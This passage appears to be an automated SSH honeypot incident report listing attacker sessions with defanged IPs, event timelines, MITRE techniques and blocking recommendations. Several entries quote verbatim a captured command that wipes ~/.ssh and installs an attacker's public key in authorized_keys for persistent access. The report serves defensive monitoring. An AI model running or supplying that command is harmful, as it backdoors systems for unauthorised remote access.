| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:38:20` | `cowrie.session.connect` |
| `2026-06-01 07:38:20` | `cowrie.client.version` |
| `2026-06-01 07:38:21` | `cowrie.client.kex` |
| `2026-06-01 07:38:22` | `cowrie.login.success` |
| `2026-06-01 07:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.80.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `71.80.194[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ee366446fce

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-06-01 07:40 |
| **Last Seen** | 2026-06-01 07:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:40:19` | `cowrie.session.connect` |
| `2026-06-01 07:40:19` | `cowrie.client.version` |
| `2026-06-01 07:40:19` | `cowrie.client.kex` |
| `2026-06-01 07:40:20` | `cowrie.login.success` |
| `2026-06-01 07:40:20` | `cowrie.session.params` |
| `2026-06-01 07:40:20` | `cowrie.command.input` |
| `2026-06-01 07:40:20` | `cowrie.command.failed` |
| `2026-06-01 07:40:20` | `cowrie.log.closed` |
| `2026-06-01 07:40:20` | `cowrie.session.params` |
| `2026-06-01 07:40:20` | `cowrie.command.input` |
| `2026-06-01 07:40:20` | `cowrie.session.file_download` |
| `2026-06-01 07:40:20` | `cowrie.log.closed` |
| `2026-06-01 07:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc52230ac67e

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-06-01 07:40 |
| **Last Seen** | 2026-06-01 07:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:40:22` | `cowrie.session.connect` |
| `2026-06-01 07:40:22` | `cowrie.client.version` |
| `2026-06-01 07:40:22` | `cowrie.client.kex` |
| `2026-06-01 07:40:23` | `cowrie.login.success` |
| `2026-06-01 07:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4854aca81890

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 07:47 |
| **Last Seen** | 2026-06-01 07:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:47:56` | `cowrie.session.connect` |
| `2026-06-01 07:47:56` | `cowrie.client.version` |
| `2026-06-01 07:47:56` | `cowrie.client.kex` |
| `2026-06-01 07:47:57` | `cowrie.login.success` |
| `2026-06-01 07:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f63706b6a98

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 08:01 |
| **Last Seen** | 2026-06-01 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 08:01:36` | `cowrie.session.connect` |
| `2026-06-01 08:01:36` | `cowrie.client.version` |
| `2026-06-01 08:01:36` | `cowrie.client.kex` |
| `2026-06-01 08:01:37` | `cowrie.login.success` |
| `2026-06-01 08:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73a48ae150a8

| Field | Detail |
|---|---|
| **Source IP** | `92.30.242[.]95` |
| **First Seen** | 2026-06-01 08:14 |
| **Last Seen** | 2026-06-01 08:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 08:14:54` | `cowrie.session.connect` |
| `2026-06-01 08:14:54` | `cowrie.client.version` |
| `2026-06-01 08:14:55` | `cowrie.client.kex` |
| `2026-06-01 08:14:55` | `cowrie.login.success` |
| `2026-06-01 08:14:56` | `cowrie.session.params` |
| `2026-06-01 08:14:56` | `cowrie.command.input` |
| `2026-06-01 08:14:56` | `cowrie.command.failed` |
| `2026-06-01 08:14:56` | `cowrie.log.closed` |
| `2026-06-01 08:14:56` | `cowrie.session.params` |
| `2026-06-01 08:14:56` | `cowrie.command.input` |
| `2026-06-01 08:14:57` | `cowrie.session.file_download` |
| `2026-06-01 08:14:57` | `cowrie.log.closed` |
| `2026-06-01 08:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.242[.]95` to AbuseIPDB if not already reported
- [ ] Block `92.30.242[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1811b998f36a

| Field | Detail |
|---|---|
| **Source IP** | `92.30.242[.]95` |
| **First Seen** | 2026-06-01 08:14 |
| **Last Seen** | 2026-06-01 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 08:14:59` | `cowrie.session.connect` |
| `2026-06-01 08:14:59` | `cowrie.client.version` |
| `2026-06-01 08:14:59` | `cowrie.client.kex` |
| `2026-06-01 08:15:00` | `cowrie.login.success` |
| `2026-06-01 08:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.242[.]95` to AbuseIPDB if not already reported
- [ ] Block `92.30.242[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d79793e01f

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 08:15 |
| **Last Seen** | 2026-06-01 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 08:15:15` | `cowrie.session.connect` |
| `2026-06-01 08:15:15` | `cowrie.client.version` |
| `2026-06-01 08:15:15` | `cowrie.client.kex` |
| `2026-06-01 08:15:16` | `cowrie.login.success` |
| `2026-06-01 08:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-535c0fd25fce

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 08:29 |
| **Last Seen** | 2026-06-01 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 08:29:00` | `cowrie.session.connect` |
| `2026-06-01 08:29:00` | `cowrie.client.version` |
| `2026-06-01 08:29:00` | `cowrie.client.kex` |
| `2026-06-01 08:29:01` | `cowrie.login.success` |
| `2026-06-01 08:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9526e563457

| Field | Detail |
|---|---|
| **Source IP** | `172.191.151[.]49` |
| **First Seen** | 2026-06-01 08:57 |
| **Last Seen** | 2026-06-01 08:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 08:57:01` | `cowrie.session.connect` |
| `2026-06-01 08:57:01` | `cowrie.client.version` |
| `2026-06-01 08:57:01` | `cowrie.client.kex` |
| `2026-06-01 08:57:02` | `cowrie.login.success` |
| `2026-06-01 08:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `172.191.151[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66955246e04c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-06-01 09:28 |
| **Last Seen** | 2026-06-01 09:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:28:59` | `cowrie.session.connect` |
| `2026-06-01 09:28:59` | `cowrie.client.version` |
| `2026-06-01 09:29:00` | `cowrie.client.kex` |
| `2026-06-01 09:29:01` | `cowrie.login.success` |
| `2026-06-01 09:29:02` | `cowrie.session.params` |
| `2026-06-01 09:29:02` | `cowrie.command.input` |
| `2026-06-01 09:29:02` | `cowrie.command.failed` |
| `2026-06-01 09:29:02` | `cowrie.log.closed` |
| `2026-06-01 09:29:02` | `cowrie.session.params` |
| `2026-06-01 09:29:02` | `cowrie.command.input` |
| `2026-06-01 09:29:03` | `cowrie.session.file_download` |
| `2026-06-01 09:29:03` | `cowrie.log.closed` |
| `2026-06-01 09:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fb7bcd290f5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-06-01 09:29 |
| **Last Seen** | 2026-06-01 09:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:29:06` | `cowrie.session.connect` |
| `2026-06-01 09:29:06` | `cowrie.client.version` |
| `2026-06-01 09:29:06` | `cowrie.client.kex` |
| `2026-06-01 09:29:08` | `cowrie.login.success` |
| `2026-06-01 09:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12e6a2e64306

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-06-01 09:31 |
| **Last Seen** | 2026-06-01 09:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:31:38` | `cowrie.session.connect` |
| `2026-06-01 09:31:38` | `cowrie.client.version` |
| `2026-06-01 09:31:38` | `cowrie.client.kex` |
| `2026-06-01 09:31:40` | `cowrie.login.success` |
| `2026-06-01 09:31:40` | `cowrie.session.params` |
| `2026-06-01 09:31:40` | `cowrie.command.input` |
| `2026-06-01 09:31:40` | `cowrie.command.failed` |
| `2026-06-01 09:31:40` | `cowrie.log.closed` |
| `2026-06-01 09:31:41` | `cowrie.session.params` |
| `2026-06-01 09:31:41` | `cowrie.command.input` |
| `2026-06-01 09:31:41` | `cowrie.session.file_download` |
| `2026-06-01 09:31:41` | `cowrie.log.closed` |
| `2026-06-01 09:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae81b3ff94ba

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-06-01 09:31 |
| **Last Seen** | 2026-06-01 09:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:31:45` | `cowrie.session.connect` |
| `2026-06-01 09:31:45` | `cowrie.client.version` |
| `2026-06-01 09:31:45` | `cowrie.client.kex` |
| `2026-06-01 09:31:46` | `cowrie.login.success` |
| `2026-06-01 09:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f022d41bfe45

| Field | Detail |
|---|---|
| **Source IP** | `64.188.83[.]134` |
| **First Seen** | 2026-06-01 09:37 |
| **Last Seen** | 2026-06-01 09:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:37:10` | `cowrie.session.connect` |
| `2026-06-01 09:37:10` | `cowrie.client.version` |
| `2026-06-01 09:37:10` | `cowrie.client.kex` |
| `2026-06-01 09:37:11` | `cowrie.login.success` |
| `2026-06-01 09:37:11` | `cowrie.session.params` |
| `2026-06-01 09:37:11` | `cowrie.command.input` |
| `2026-06-01 09:37:11` | `cowrie.command.failed` |
| `2026-06-01 09:37:11` | `cowrie.log.closed` |
| `2026-06-01 09:37:12` | `cowrie.session.params` |
| `2026-06-01 09:37:12` | `cowrie.command.input` |
| `2026-06-01 09:37:12` | `cowrie.session.file_download` |
| `2026-06-01 09:37:12` | `cowrie.log.closed` |
| `2026-06-01 09:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.83[.]134` to AbuseIPDB if not already reported
- [ ] Block `64.188.83[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab5c60c690d8

| Field | Detail |
|---|---|
| **Source IP** | `64.188.83[.]134` |
| **First Seen** | 2026-06-01 09:37 |
| **Last Seen** | 2026-06-01 09:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:37:14` | `cowrie.session.connect` |
| `2026-06-01 09:37:14` | `cowrie.client.version` |
| `2026-06-01 09:37:14` | `cowrie.client.kex` |
| `2026-06-01 09:37:15` | `cowrie.login.success` |
| `2026-06-01 09:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.83[.]134` to AbuseIPDB if not already reported
- [ ] Block `64.188.83[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2294cb8c85a

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:49 |
| **Last Seen** | 2026-06-01 09:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:49:06` | `cowrie.session.connect` |
| `2026-06-01 09:49:06` | `cowrie.client.version` |
| `2026-06-01 09:49:06` | `cowrie.client.kex` |
| `2026-06-01 09:49:07` | `cowrie.login.success` |
| `2026-06-01 09:49:08` | `cowrie.session.params` |
| `2026-06-01 09:49:08` | `cowrie.command.input` |
| `2026-06-01 09:49:08` | `cowrie.command.failed` |
| `2026-06-01 09:49:08` | `cowrie.log.closed` |
| `2026-06-01 09:49:09` | `cowrie.session.params` |
| `2026-06-01 09:49:09` | `cowrie.command.input` |
| `2026-06-01 09:49:09` | `cowrie.session.file_download` |
| `2026-06-01 09:49:09` | `cowrie.log.closed` |
| `2026-06-01 09:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1be189a0d3f

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:49 |
| **Last Seen** | 2026-06-01 09:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:49:13` | `cowrie.session.connect` |
| `2026-06-01 09:49:13` | `cowrie.client.version` |
| `2026-06-01 09:49:14` | `cowrie.client.kex` |
| `2026-06-01 09:49:15` | `cowrie.login.success` |
| `2026-06-01 09:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd90650b3783

| Field | Detail |
|---|---|
| **Source IP** | `187.212.47[.]18` |
| **First Seen** | 2026-06-01 09:51 |
| **Last Seen** | 2026-06-01 09:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 09:51:50` | `cowrie.session.connect` |
| `2026-06-01 09:51:50` | `cowrie.client.version` |
| `2026-06-01 09:51:50` | `cowrie.client.kex` |
| `2026-06-01 09:51:52` | `cowrie.login.success` |
| `2026-06-01 09:51:52` | `cowrie.session.params` |
| `2026-06-01 09:51:52` | `cowrie.command.input` |
| `2026-06-01 09:51:52` | `cowrie.command.failed` |
| `2026-06-01 09:51:53` | `cowrie.log.closed` |
| `2026-06-01 09:51:53` | `cowrie.session.params` |
| `2026-06-01 09:51:53` | `cowrie.command.input` |
| `2026-06-01 09:51:53` | `cowrie.session.file_download` |
| `2026-06-01 09:51:53` | `cowrie.log.closed` |
| `2026-06-01 09:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.212.47[.]18` to AbuseIPDB if not already reported
- [ ] Block `187.212.47[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc54b8d3966

| Field | Detail |
|---|---|
| **Source IP** | `198.154.207[.]145` |
| **First Seen** | 2026-06-01 09:51 |
| **Last Seen** | 2026-06-01 09:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
